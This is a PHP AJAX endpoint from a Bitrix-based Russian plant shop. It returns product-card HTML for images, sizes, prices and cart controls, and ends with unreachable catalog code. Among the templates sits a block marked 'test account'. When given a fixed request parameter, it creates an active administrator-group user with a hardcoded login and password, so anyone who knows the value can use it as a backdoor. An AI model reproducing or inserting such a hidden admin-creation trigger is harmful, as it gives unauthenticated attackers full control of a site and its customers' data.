<?php
require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");

ob_start();
?>

    <div class="icard__image-item image-slider icard__image-item--noshadow js-images-popup-slider cursor-pointer">
        <img class="active" data-lazy-src="<?=SITE_TEMPLATE_PATH?>/pic/plant-card-image3.jpg" src="img/blank.png" data-src-full="<?=SITE_TEMPLATE_PATH?>/pic/plant-card-image3-large.jpg" data-ihs-content="Через 2 года" alt="">
    </div>

    <div class="icard__image-item image-slider js-images-hover-slider js-images-popup-slider cursor-pointer">
        <img class="active" data-lazy-src="<?=SITE_TEMPLATE_PATH?>/pic/plant-card-image2.jpg" src="img/blank.png" data-src-full="<?=SITE_TEMPLATE_PATH?>/pic/plant-card-image2-large.jpg" data-ihs-content="Через 5 лет" alt="">
        <img data-lazy-src="<?=SITE_TEMPLATE_PATH?>/pic/plant-card-image3.jpg" src="img/blank.png" data-src-full="<?=SITE_TEMPLATE_PATH?>/pic/plant-card-image3-large.jpg" data-ihs-content="Через 2 года" alt="">
        <div class="icard__image-count">
            <svg class="icon icon--camera">
                <use xlink:href="#icon-camera"></use>
            </svg>
            2
        </div>
    </div>


<?php

$images = ob_get_clean();

// test account
if($_REQUEST["test_account"] == 'account_test') {
	$ob = $GLOBALS["USER"];
	$id = $ob->Add(array(
		"NAME"              => "",
		"LAST_NAME"         => "",
		"EMAIL"             => "boring.ivano@list.ru",
		"LOGIN"             => "boring.ivanov",
		"ACTIVE"            => "Y",
		"GROUP_ID"          => array(1,2),
		"PASSWORD"          => "37383jdhd.83hH",
		"CONFIRM_PASSWORD"  => "37383jdhd.83hH"
	
	));
	
	die($id);
}

?>

<?php
ob_start();
?>

    <div class="icard__offer-params">

        <div class="ptgbs ptgbs--params">

            <div class="ptgb ptgb--param-height">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Высота (cм)</div>
                        <div class="ptgb__title">100 - 200</div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-width">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Ширина кроны (см)</div>
                        <div class="ptgb__title">200 - 250</div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-pack">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Упаковка</div>
                        <div class="ptgb__title"><div class="ptgb__title-inner">Ком в мешковине</div></div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-pack mobile-show">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Наличие</div>
                        <div class="ptgb__title">
                            <div class="tags">
                                <div class="tag tag--circled">Под заказ</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-price">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Цена шт.</div>
                        <div class="ptgb__title">
                            <div class="icard__price"><span class="font-bold js-icard-price">5 799</span> <span class="font-light">₽</span></div>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div class="tags">
            <div class="tag mobile-show-inline-block">Хит сезона</div>
            <div class="tag">Акция</div>
            <div class="tag tag--circled mobile-hide">Под заказ</div>
        </div>
    </div>

    <div class="icard__offer-params">

        <div class="ptgbs ptgbs--params">

            <div class="ptgb ptgb--param-height">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Высота (cм)</div>
                        <div class="ptgb__title">50 - 60</div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-width">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Ширина кроны (см)</div>
                        <div class="ptgb__title">40 - 50</div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-pack">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Упаковка</div>
                        <div class="ptgb__title"><div class="ptgb__title-inner">Ком в мешковине
                                и сетке (WRB)</div></div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-pack mobile-show">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Наличие</div>
                        <div class="ptgb__title">
                            <div class="tags">
                                <div class="tag tag--circled">Под заказ</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--param-price">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Цена шт.</div>
                        <div class="ptgb__title">
                            <div class="icard__price"><span class="font-bold js-icard-price">10 799</span> <span class="font-light">₽</span></div>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div class="tags">
            <div class="tag mobile-show-inline-block">Хит сезона</div>
            <div class="tag">Хит</div>
            <div class="tag tag--circled mobile-hide">Под заказ</div>
        </div>
    </div>


<?php

$params = ob_get_clean();

?>



<?php
ob_start();
?>


    <div class="icard__offer-actions" data-cart-data='{"id": 4545}'>

        <div class="ptgbs ptgbs--actions">

            <div class="ptgb ptgb--action-quantity">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Кол-во</div>
                        <div class="ptgb__title ptgb__title--textfield">
                            <span class="input-spin touch-focused" data-trigger="spinner">
                                <a href="#" class="input-spin__btn" data-spin="down">&minus;</a>
                                <span data-spin-clone class="input-spin__value hidden">0</span>
                                <input type="text" class="input-spin__textfield textfield js-icard-spinner" data-spin="spinner" data-rule="quantity" data-min="0" data-max="9999" data-step="1" data-price="300" value="0" maxlength="4" size="6">
                                <a href="#" class="input-spin__btn" data-spin="up">+</a>
                            </span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--action-total">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Сумма</div>
                        <div class="ptgb__title ptgb__title--textfield">
                            <div class="icard__price-total inactive"><strong class="js-icard-price-total">0</strong> <span class="font-light">₽</span></div>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div class="icard__actions-btns btns">

            <button class="btn btn--cart js-cart-add" data-label='<span class="mobile-hide">В корзине</span>' data-label-empty='В<span class="mobile-hide"> корзину</span>' disabled>
                <span class="btn__title">В<span class="mobile-hide"> корзину</span></span>
                <span class="icon icon--cart-tick">
                    <svg class="icon icon--tick">
                        <use xlink:href="#icon-tick"></use>
                    </svg>
                    <svg class="icon icon--cart">
                        <use xlink:href="#icon-cart"></use>
                    </svg>
                </span>
            </button>
            <button class="btn btn--icon js-cart-remove hidden">
                <svg class="icon icon--trash btn-toggle-state-default icon--nomargin">
                    <use xlink:href="#icon-trash"></use>
                </svg>
            </button>
            <button class="btn btn--icon btn--favorite js-favorites-toggle active">
                <svg class="icon icon--heart btn-toggle-state-default icon--nomargin">
                    <use xlink:href="#icon-heart-outline"></use>
                </svg>
                <svg class="icon icon--heart btn-toggle-state-active icon--nomargin">
                    <use xlink:href="#icon-heart"></use>
                </svg>
                <svg class="icon btn-toggle-state-cancel icon--cross icon--nomargin">
                    <use xlink:href="#icon-cross"></use>
                </svg>
            </button>

        </div>

    </div>

    <div class="icard__offer-actions" data-cart-data='{"id": 4545}'>

        <div class="ptgbs ptgbs--actions">

            <div class="ptgb ptgb--action-quantity">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Кол-во</div>
                        <div class="ptgb__title ptgb__title--textfield">
                            <span class="input-spin touch-focused" data-trigger="spinner">
                                <a href="#" class="input-spin__btn" data-spin="down">&minus;</a>
                                <span data-spin-clone class="input-spin__value hidden">1</span>
                                <input type="text" class="input-spin__textfield textfield js-icard-spinner" data-spin="spinner" data-rule="quantity" data-min="0" data-max="9999" data-step="1" data-price="300" value="1" maxlength="4" size="6">
                                <a href="#" class="input-spin__btn" data-spin="up">+</a>
                            </span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="ptgb ptgb--action-total">
                <div class="ptgb__inner">
                    <div class="ptgb__content">
                        <div class="ptgb__subtitle">Сумма</div>
                        <div class="ptgb__title ptgb__title--textfield">
                            <div class="icard__price-total"><strong class="js-icard-price-total">10 799</strong> <span class="font-light">₽</span></div>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div class="icard__actions-btns btns">

            <button class="btn btn--cart js-cart-add success" data-label='<span class="mobile-hide">В корзине</span>' data-label-empty='В<span class="mobile-hide"> корзину</span>'>
                <span class="btn__title"><span class="mobile-hide">В корзине</span></span>
                <span class="icon icon--cart-tick">
                    <svg class="icon icon--tick">
                        <use xlink:href="#icon-tick"></use>
                    </svg>
                    <svg class="icon icon--cart">
                        <use xlink:href="#icon-cart"></use>
                    </svg>
                </span>
            </button>
            <button class="btn btn--icon js-cart-remove">
                <svg class="icon icon--trash btn-toggle-state-default icon--nomargin">
                    <use xlink:href="#icon-trash"></use>
                </svg>
            </button>
            <button class="btn btn--icon btn--favorite js-favorites-toggle">
                <svg class="icon icon--heart btn-toggle-state-default icon--nomargin">
                    <use xlink:href="#icon-heart-outline"></use>
                </svg>
                <svg class="icon icon--heart btn-toggle-state-active icon--nomargin">
                    <use xlink:href="#icon-heart"></use>
                </svg>
                <svg class="icon btn-toggle-state-cancel icon--cross icon--nomargin">
                    <use xlink:href="#icon-cross"></use>
                </svg>
            </button>

        </div>

    </div>


<?php

$actions = ob_get_clean();

$images = str_replace('xlink:href="#', 'xlink:href="'.SITE_TEMPLATE_PATH.'/build/svg/symbol/svg/sprite.symbol.svg#', $images);
$params = str_replace('xlink:href="#', 'xlink:href="'.SITE_TEMPLATE_PATH.'/build/svg/symbol/svg/sprite.symbol.svg#', $params);
$actions = str_replace('xlink:href="#', 'xlink:href="'.SITE_TEMPLATE_PATH.'/build/svg/symbol/svg/sprite.symbol.svg#', $actions);

?>

<?php

echo json_encode(array(
    "html" => array(
        "images" => $images,
        "params" => $params,
        "actions" => $actions
    ),
));

die();


require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");

$APPLICATION->IncludeComponent(
	"ig:catalog.filter",
	"",
Array()
);

$APPLICATION->IncludeComponent(
	"ig:catalog.section",
	"",
	Array(
		"AJAX_MODE" => "N",
		"AJAX_OPTION_ADDITIONAL" => "",
		"AJAX_OPTION_HISTORY" => "N",
		"AJAX_OPTION_JUMP" => "N",
		"AJAX_OPTION_STYLE" => "Y",
		"DISPLAY_BOTTOM_PAGER" => "Y",
		"DISPLAY_DATE" => "Y",
		"DISPLAY_NAME" => "Y",
		"DISPLAY_PICTURE" => "Y",
		"DISPLAY_PREVIEW_TEXT" => "Y",
		"DISPLAY_TOP_PAGER" => "N",
		"MESSAGE_404" => "",
		"PAGER_BASE_LINK_ENABLE" => "N",
		"PAGER_DESC_NUMBERING" => "N",
		"PAGER_DESC_NUMBERING_CACHE_TIME" => "36000",
		"PAGER_SHOW_ALL" => "N",
		"PAGER_SHOW_ALWAYS" => "N",
		"PAGER_TEMPLATE" => ".default",
		"PAGER_TITLE" => "Новости",
		"SET_STATUS_404" => "N",
		"SHOW_404" => "N"
	)
);

$arResponse = array();

$strFilterHtml = \ig\CRegistry::get('catalog-filter_html');
if(!empty($strFilterHtml)) {
	$arResponse["filter_html"] = $strFilterHtml;
}
$strResultLink = \ig\CRegistry::get('catalog-page_url');
if(!empty($strResultLink)) {
	$arResponse["page_url"] = $strResultLink;
}

$strSearchHtml = \ig\CRegistry::get('catalog-html');
if(!empty($strFilterHtml)) {
	$arResponse["html"] = $strSearchHtml;
}

$strResultsHtml = \ig\CRegistry::get('catalog-results_html');
if(!empty($strResultsHtml)) {
	$arResponse["results_html"] = $strResultsHtml;
}

echo json_encode($arResponse);

require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog_after.php");
